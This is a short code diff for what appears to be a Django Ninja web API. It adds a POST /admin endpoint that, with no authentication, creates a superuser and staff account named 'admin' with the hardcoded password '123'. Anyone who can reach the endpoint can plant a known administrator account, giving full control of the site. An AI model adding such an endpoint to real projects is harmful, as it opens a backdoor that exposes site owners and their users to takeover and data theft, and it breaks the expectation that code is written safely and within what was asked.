@@ -49,3 +49,13 @@ def single_post(request, post_id: int):
     post = get_object_or_404(Post, id=post_id)
 
     return post
+
+@api.post("/admin")
+def register_admin(request):
+    from django.contrib.auth import get_user_model
+
+    get_user_model().objects._create_user(username = "admin", email="admin@django.com", password = "123", is_superuser = True, is_staff=True)
+
+    return{
+        "message": "successful"
+    }
